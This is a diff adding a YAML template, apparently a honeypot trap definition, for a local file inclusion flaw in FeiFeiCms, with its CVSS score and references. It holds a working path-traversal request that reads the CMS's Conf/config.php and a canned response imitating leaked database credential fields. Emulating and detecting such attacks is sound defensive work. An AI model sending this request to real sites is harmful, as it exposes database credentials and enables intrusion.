@@ -1,0 +1,26 @@
+id: feifeicms-lfr
+info:
+  name: FeiFeiCms - Local File Inclusion
+  author: princechaddha
+  description: FeiFeiCms is vulnerable to local file inclusion.
+  severity: high
+  reference:
+  - https://www.cnblogs.com/jinqi520/p/10202615.html
+  - https://gitee.com/daicuo/feifeicms
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: feifeicms,lfi
+traps:
+- request:
+    method: GET
+    path: /index.php?s=Admin-Data-down&id=../../Conf/config.php
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: <?phpdb_namedb_pwddb_host
